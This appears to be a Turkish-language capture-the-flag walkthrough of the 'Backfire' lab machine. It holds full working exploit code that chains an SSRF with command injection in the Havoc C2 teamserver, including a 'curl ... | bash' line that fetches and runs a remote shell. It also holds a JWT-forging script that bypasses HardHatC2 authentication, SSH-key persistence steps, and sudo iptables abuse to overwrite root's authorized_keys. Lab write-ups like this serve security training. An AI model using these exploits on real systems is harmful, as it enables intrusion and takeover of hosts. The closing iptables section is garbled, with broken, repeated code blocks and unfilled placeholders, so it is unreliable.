---
{"dg-publish":true,"permalink":"/ctf/backfire-ctf/"}
---



```
nmap -p- -sSCV  10.10.11.49 -T5             

Nmap scan report for 10.10.11.49
Host is up (0.23s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open     ssl/http nginx 1.22.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: 404 Not Found
|_http-server-header: nginx/1.22.1
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=SYNERGY LLC/stateOrProvinceName=Washington/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Not valid before: 2024-09-20T18:01:08
|_Not valid after:  2027-09-20T18:01:08
5000/tcp filtered upnp
7096/tcp filtered unknown
8000/tcp open     http     nginx 1.22.1
|_http-open-proxy: Proxy might be redirecting requests
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 11:31  disable_tls.patch
| 875   17-Dec-2024 11:34  havoc.yaotl
|_
|_http-title: Index of /
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 603.91 seconds

```

- **22/tcp (SSH) - OpenSSH 9.2p1 Debian 2+deb12u4**
    
    - SSH servisi açık ve `OpenSSH 9.2p1 Debian` sürümü kullanılıyor.
    - Bu servise giriş yapmak için daha fazla bilgi gerekecektir. Şayet zayıf bir parola veya anahtar yönetimi varsa, SSH üzerinden giriş yapılabilir.

- **443/tcp (SSL/HTTP) - nginx 1.22.1**
    
    - HTTPS (SSL) servisi açık, ancak "404 Not Found" hatası veriyor.
    - SSL sertifikası, `127.0.0.1` IP adresi için düzenlenmiş ve `SYNERGY LLC` tarafından verilmiş.
    - Sertifika geçerlilik süresi 2024-09-20 ile 2027-09-20 arasında.
    - Bu port üzerinde bazı güvenlik zafiyetlerini aramak veya HTTPS ile yapılan iletişimdeki zayıf noktaları incelemek faydalı olabilir.

- **5000/tcp - UPnP (filtered)**
    
    - Bu port, UPnP servisi ile ilgili ve "filtered" olarak işaretlenmiş. Yani, bu portun aktif olup olmadığı kesin olarak belirlenememiştir. UPnP ile ilgili bilinen bazı zafiyetler bulunuyor, bu nedenle portu kontrol etmek faydalı olabilir.

- **7096/tcp - Unknown (filtered)**
    
    - Bu port bilinmiyor ve "filtered" olarak işaretlenmiş. Yani bu port ile ilgili herhangi bir bilgi mevcut değil. Daha fazla bilgi edinmek için port taramayı derinleştirmek gerekebilir.

- **8000/tcp (HTTP) - nginx 1.22.1**
    
    - Bu port açık ve nginx 1.22.1 sürümü çalışıyor.
    - Web sunucusunda `/` dizininde birkaç dosya listeleniyor:
        - **disable_tls.patch** (1559 byte, 17-Dec-2024)
        - **havoc.yaotl** (875 byte, 17-Dec-2024)
    - Bu dosyalar, web sunucusunda barındırılıyor ve potansiyel olarak güvenlik açığı yaratabilir.
    - **http-ls** komutu ile bu dosyalar listelenmiş. Bu dosyalar üzerinde inceleme yaparak, herhangi bir güvenlik açığı arayabilirsiniz.
    - Ayrıca, bu portta bir HTTP proxy olabilir (özellikle "http-open-proxy" uyarısı).


![Pasted image 20250120041412.png](/img/user/resimler/Pasted%20image%2020250120041412.png)


### havoc.yaotl

```
cat havoc.yaotl
Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}

```

![Pasted image 20250120041626.png](/img/user/resimler/Pasted%20image%2020250120041626.png)


### **disable_tls.patch**
```
cat disable_tls.patch 
Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromize our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
                }
 
                // start the teamserver
-               if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+               if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
                        logger.Error("Failed to start websocket: " + err.Error())
                }

```

Bir Havoc sunucusu açılmış gibi görünüyor: [HavocFramework/Havoc: The Havoc Framework](https://github.com/HavocFramework/Havoc)

ve bağlanmak için kullanıcı adı ve şifreyi gösteriyor, ancak Havoc'u yükledikten sonra bağlanamıyorum!



## Havoc RCE

Araştırdıktan sonra olası bir CVE güvenlik açığı buldum

![Pasted image 20250121201336.png](/img/user/resimler/Pasted%20image%2020250121201336.png)

https://github.com/chebuya/Havoc-C2-SSRF-poc

Ve bu.

https://github.com/IncludeSecurity/c2-vulnerabilities

### Birinci Script'in Ana İşlevleri

1. **Sahte Agent Kaydı**: Sahte bir agent kaydı isteği göndererek hedef sunucunun bazı işlemleri tetiklemesini sağlar (örneğin, bir soket açmak gibi).
2. **Soket Açma**: Belirli bir komut aracılığıyla hedef sunucunun soket açmasını kontrol eder, böylece remote bağlantılara izin verir.
3. **Sokete Veri Yazma**: Sunucu tarafından açılan sokete veri gönderir, bu veriler daha fazla talep veya komutlar için kullanılabilir.
4. **Soket Verilerini Okuma**: Hedef sunucunun yanıtını okuyarak, örneğin IP adresleri gibi hassas bilgileri alır.

---

### İkinci Script'in Ana İşlevleri

1. **WebSocket Bağlantısı**: Şifrelenmiş bir `wss://` protokolü ile remote ekip sunucusuna WebSocket bağlantısı kurar.
2. **Kimlik Doğrulama**: Kullanıcı adı ve SHA3-256 ile şifrelenmiş bir parola kullanarak kimlik doğrulaması yapar.
3. **Listener (Dinleyici) Oluşturma**: Sunucuya, bir "demon agent" oluşturmak için bir listener kurma isteği gönderir.
4. (RCE)**: Komut enjeksiyon açığını kullanarak, sunucuya kötü niyetli bir payload gönderir ve local komutların çalıştırılmasını sağlar.

```
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
```


### Protokol Yükseltme Verilerini Soket Üzerinden Sunucuya Gönderme

WebSocket iletişimi kullanıldığından, gönderilen verilerin WebSocket formatına dönüştürülmesi gerekir. Python’un standart kütüphanesi bu işlemleri otomatik olarak yönetir, ancak burada HTTP’den WebSocket’e geçiş yapıldığı için verilerin manuel olarak WebSocket veri çerçevesine (`data frame`) dönüştürülmesi gerekir.

Nihai kod aşağıdaki gibidir

```
import binascii
import json
import random
import requests
import argparse
import urllib3
import os
import hashlib
urllib3.disable_warnings()
 
 
from Crypto.Cipher import AES
from Crypto.Util import Counter
 
key_bytes = 32
 
def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"
 
    assert len(key) == key_bytes
 
    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
 
    plaintext = aes.decrypt(ciphertext)
    return plaintext
 
 
def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)
 
 
def encrypt(key, iv, plaintext):
 
    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"
 
        assert len(key) == key_bytes
 
        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)
 
        ciphertext = aes.encrypt(plaintext)
        return ciphertext
 
def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id
 
    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)
 
    data =  b"\xab" * 100
 
    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
 
    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")
 
 
def open_socket(socket_id, target_address, target_port):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"
 
    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"
 
    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"
 
 
    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)
 
    forward_port = int_to_bytes(target_port)
 
    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)
 
    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data
 
 
    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")
 
 
def write_socket(socket_id, data):
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"
 
    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"
 
    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"
 
    data_length = int_to_bytes(len(data))
 
    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)
 
    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data
 
    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")
 
 
def read_socket(socket_id):
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"
 
    header_data = command + request_id
 
    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data
 
 
    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""
 
 
    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]
 
    return decrypt(AES_Key, AES_IV, enc_package)[12:]
 
def create_websocket_request(host, port):
    request = (
        f"GET /havoc/ HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode()
    return request
 
def build_websocket_frame(payload):
    payload_bytes = payload.encode("utf-8")
    frame = bytearray()
    frame.append(0x81)
    payload_length = len(payload_bytes)
    if payload_length <= 125:
        frame.append(0x80 | payload_length)
    elif payload_length <= 65535:
        frame.append(0x80 | 126)
        frame.extend(payload_length.to_bytes(2, byteorder="big"))
    else:
        frame.append(0x80 | 127)
        frame.extend(payload_length.to_bytes(8, byteorder="big"))
 
    masking_key = os.urandom(4)
    frame.extend(masking_key)
    masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
    frame.extend(masked_payload)
 
    return frame
 
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")
 
args = parser.parse_args()
 
 
# 0xDEADBEEF
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
        "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))
 
register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
 
socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))
 
HOSTNAME = "127.0.0.1"
PORT = 40056
USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"
 
 
#upgrade http to websocet  so that we can use the second script
write_socket(socket_id,create_websocket_request(host=HOSTNAME, port=PORT))
 
# Authenticate to teamserver
payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
payload_json=json.dumps(payload)
write_socket(socket_id, build_websocket_frame(payload_json))
 
 
 
# Create a listener to build demon agent for
payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
payload_json=json.dumps(payload)
write_socket(socket_id, build_websocket_frame(payload_json))
 
 
# Create a psuedo shell with RCE loop   Change Here
cmd = 'curl http://10.10.16.2/shell.sh | bash'
 
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
# Command injection in demon compilation command
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
    "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
 
payload_json=json.dumps(payload)
write_socket(socket_id, build_websocket_frame(payload_json))
```

![Pasted image 20250121202258.png](/img/user/resimler/Pasted%20image%2020250121202258.png)

![Pasted image 20250121202322.png](/img/user/resimler/Pasted%20image%2020250121202322.png)

![Pasted image 20250121202340.png](/img/user/resimler/Pasted%20image%2020250121202340.png)




Ardından bir listening kurun, bounce shell'i alın ve user.txt dosyasını alın

















































 Her iki içerik oluşturucunun github'larına bir göz atalım

![Pasted image 20250120041738.png](/img/user/resimler/Pasted%20image%2020250120041738.png)

"Biz, im chebuyas'ı 'Havoc-C2-SSRF-poc' olarak görüyoruz"

![Pasted image 20250120041803.png](/img/user/resimler/Pasted%20image%2020250120041803.png)

![Pasted image 20250120042311.png](/img/user/resimler/Pasted%20image%2020250120042311.png)

![Pasted image 20250120042322.png](/img/user/resimler/Pasted%20image%2020250120042322.png)

Ssrf'yi kutu üzerinde çalıştırmayı başardım ama gerçekten hiçbir şey çıkmıyordu

![Pasted image 20250120042356.png](/img/user/resimler/Pasted%20image%2020250120042356.png)

Hyperrealitys github'da c2 vulnerabiltys adlı bir bölüm buluyoruz ve içinde havoc_auth_rce adlı bir klasör var

![Pasted image 20250120042441.png](/img/user/resimler/Pasted%20image%2020250120042441.png)

Kendi havoc instance'ımı başlattım

----

![Pasted image 20250120060443.png](/img/user/resimler/Pasted%20image%2020250120060443.png)

![Pasted image 20250120060451.png](/img/user/resimler/Pasted%20image%2020250120060451.png)

![Pasted image 20250121202907.png](/img/user/resimler/Pasted%20image%2020250121202907.png)

![Pasted image 20250121202915.png](/img/user/resimler/Pasted%20image%2020250121202915.png)


## Root

Bu bounce shell bir süre sonra bağlantıyı keseceğinden, kalıcı bir bağlantı kurmanın bir yolunu bulmanız gerekir

Lokal ssh public anahtarınızı ilya'nın anahtar dosyasına ekleyin.

Eğer Kali makinenizde bir SSH anahtar çifti yoksa aşağıdaki komutla oluşturabilirsiniz:

![Pasted image 20250121203236.png](/img/user/resimler/Pasted%20image%2020250121203236.png)

- Komut çalıştırıldığında, anahtar dosyasını kaydedeceğiniz yeri soracaktır (varsayılan olarak `~/.ssh/id_rsa` dizini kullanılır). Varsayılanı kabul etmek için `Enter` tuşuna basabilirsiniz.
- Parola sorarsa, boş bırakabilirsiniz (kalıcı bağlantı için parola kullanmadan erişim sağlamanız gerekir).

Bu işlemden sonra, iki dosya oluşturulur:

- **Private anahtar**: `~/.ssh/id_rsa`
- **Public anahtar**: `~/.ssh/id_rsa.pub`


**Public Anahtarınızı Hedefe Ekleyin**

Genel anahtarınızı hedef makinedeki `~/.ssh/authorized_keys` dosyasına eklemeniz gerekiyor. Bunun için:

![Pasted image 20250121203348.png](/img/user/resimler/Pasted%20image%2020250121203348.png)


Hedefteki `authorized_keys` Dosyasına Ekleyin

- Reverse shell bağlantınızdan hedef makineye erişin.
- Hedef kullanıcının (`ilya`) home dizinindeki `.ssh` klasörüne gidin

Eğer `authorized_keys` dosyası yoksa oluşturun. (bizim durumumuzda var.)

```
touch authorized_keys 
chmod 600 authorized_keys
```

Kendi `id_rsa.pub` anahtarınızı bu dosyaya ekleyin. Reverse shell'de aşağıdaki komutu çalıştırabilirsiniz:

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDj/3gLb5CqayZHG8NynOzx6uN6tOAkNG3E5OKxFv6tTLIiA89T8l+68Pm/VjXcQ1y3/S3TqQf73p6MRKOy+zK6Ay3S/oKoI4+0dp5DcJjn01ZG87hCQWdriR93HUcYgUG71AI+M8GzEYe3x+xdDLOOjdM+1R4Pjm21R/vW7FFvzG265B5nZtMoLesHXSCvdrE6WwhVULcnH1Hn+1SnP5ZlGkdJaKtKcph4K0fittKij1US/SZ6P6szf4PpOjF8xyhBpizqqfuu2ACCTBUB2yznYSH0JCIC4UMGNZNpVN0lK8vGMbFEPs+rn9Pm017jlJTth3JjYdXyJdKl2vCnj9x5 root@kali" >> authorized_keys
```

![Pasted image 20250121203645.png](/img/user/resimler/Pasted%20image%2020250121203645.png)

![Pasted image 20250121203714.png](/img/user/resimler/Pasted%20image%2020250121203714.png)

![Pasted image 20250121203737.png](/img/user/resimler/Pasted%20image%2020250121203737.png)

![Pasted image 20250121203753.png](/img/user/resimler/Pasted%20image%2020250121203753.png)

"Sergej, HardHatC2'yi test amacıyla kurduğunu ve varsayılan ayarları değiştirmediğini söyledi.  
Umarım Havoc'u tercih eder çünkü başka bir C2 framework'ü öğrenmek istemiyorum, ayrıca Go > C#."

İntranet portlarının durumunu kontrol etme

![Pasted image 20250121203927.png](/img/user/resimler/Pasted%20image%2020250121203927.png)

Bu HardHatC2 ile ilgili güvenlik açıklarını ararken şunu buldum 👇

https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7

Öncelikle, SSH aracılığıyla intranet üzerindeki 7096 ve 5000 numaralı portları proxy'lemeniz gerekir

![Pasted image 20250121204109.png](/img/user/resimler/Pasted%20image%2020250121204109.png)

sonra çalıştır

```
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests
 
rhost = '127.0.0.1:5000'
 
# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()
 
expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}
 
token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)
 
# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "sth_pentest",
  "role": "TeamLead",
  "username": "sth_pentest"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```

![Pasted image 20250121204206.png](/img/user/resimler/Pasted%20image%2020250121204206.png)

Çalıştırdıktan sonra kullanıcının başarıyla oluşturulduğunu görebilirsiniz. Ardından [https://127.0.0.1:7096/](https://127.0.0.1:7096/) adresine gidin ve kullanıcı adı ve şifre ile giriş yapın.

Simüle edilmiş terminale gelerek komutlar çalıştırın.

Aynı yöntemle kendi SSH anahtarınızı Sergej'in anahtarlarına ekleyin.

```
username : sth_pentest
username : sth_pentest
```

![Pasted image 20250121205301.png](/img/user/resimler/Pasted%20image%2020250121205301.png)

![Pasted image 20250121205821.png](/img/user/resimler/Pasted%20image%2020250121205821.png)

![Pasted image 20250121205901.png](/img/user/resimler/Pasted%20image%2020250121205901.png)

Ardından sudo izinleri komutunu görmek için ssh kullanarak sergej'de oturum açın

![Pasted image 20250121205928.png](/img/user/resimler/Pasted%20image%2020250121205928.png)

iptables ile ilgili power-up'ları arayın

https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/

https://cn-sec.com/archives/3193918.html

Yorumlama işlevi, diğer dosyaların üzerine yazmak için kullanılabilir, bu nedenle bazı hassas dosyaların üzerine yazmayı düşünebilirsiniz, özellikle root kimliğini taklit edebilecek dosyaları.

```
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment 

Testler sonucunda bu `comment`'in uzunluğunun çok fazla olamayacağı belirlendi, bu nedenle SSH anahtarının uzunluğu nispeten kısa olmalıdır.

![Pasted image 20250121210235.png](/img/user/resimler/Pasted%20image%2020250121210235.png)

Ardından root'un anahtar dosyasının üzerine yazın

```
sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment 


![Pasted image 20250121210633.png](/img/user/resimler/Pasted%20image%2020250121210633.png)

![Pasted image 20250121210705.png](/img/user/resimler/Pasted%20image%2020250121210705.png)

![Pasted image 20250121211521.png](/img/user/resimler/Pasted%20image%2020250121211521.png)

![Pasted image 20250121211602.png](/img/user/resimler/Pasted%20image%2020250121211602.png)
\nYourKeysHere\n'
```

Testler sonucunda bu `comment`'in uzunluğunun çok fazla olamayacağı belirlendi, bu nedenle SSH anahtarının uzunluğu nispeten kısa olmalıdır.

![Pasted image 20250121210235.png](/img/user/resimler/Pasted%20image%2020250121210235.png)

Ardından root'un anahtar dosyasının üzerine yazın

{{CODE_BLOCK_10}}


![Pasted image 20250121210633.png](/img/user/resimler/Pasted%20image%2020250121210633.png)

![Pasted image 20250121210705.png](/img/user/resimler/Pasted%20image%2020250121210705.png)

![Pasted image 20250121211521.png](/img/user/resimler/Pasted%20image%2020250121211521.png)

![Pasted image 20250121211602.png](/img/user/resimler/Pasted%20image%2020250121211602.png)
\n your_ed25519_pub_keys\n'
 
sergej@backfire:~$ sudo /usr/sbin/iptables -S
 
sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```


![Pasted image 20250121210633.png](/img/user/resimler/Pasted%20image%2020250121210633.png)

![Pasted image 20250121210705.png](/img/user/resimler/Pasted%20image%2020250121210705.png)

![Pasted image 20250121211521.png](/img/user/resimler/Pasted%20image%2020250121211521.png)

![Pasted image 20250121211602.png](/img/user/resimler/Pasted%20image%2020250121211602.png)
\nYourKeysHere\n'
```

Testler sonucunda bu `comment`'in uzunluğunun çok fazla olamayacağı belirlendi, bu nedenle SSH anahtarının uzunluğu nispeten kısa olmalıdır.

![Pasted image 20250121210235.png](/img/user/resimler/Pasted%20image%2020250121210235.png)

Ardından root'un anahtar dosyasının üzerine yazın

{{CODE_BLOCK_10}}


![Pasted image 20250121210633.png](/img/user/resimler/Pasted%20image%2020250121210633.png)

![Pasted image 20250121210705.png](/img/user/resimler/Pasted%20image%2020250121210705.png)

![Pasted image 20250121211521.png](/img/user/resimler/Pasted%20image%2020250121211521.png)

![Pasted image 20250121211602.png](/img/user/resimler/Pasted%20image%2020250121211602.png)
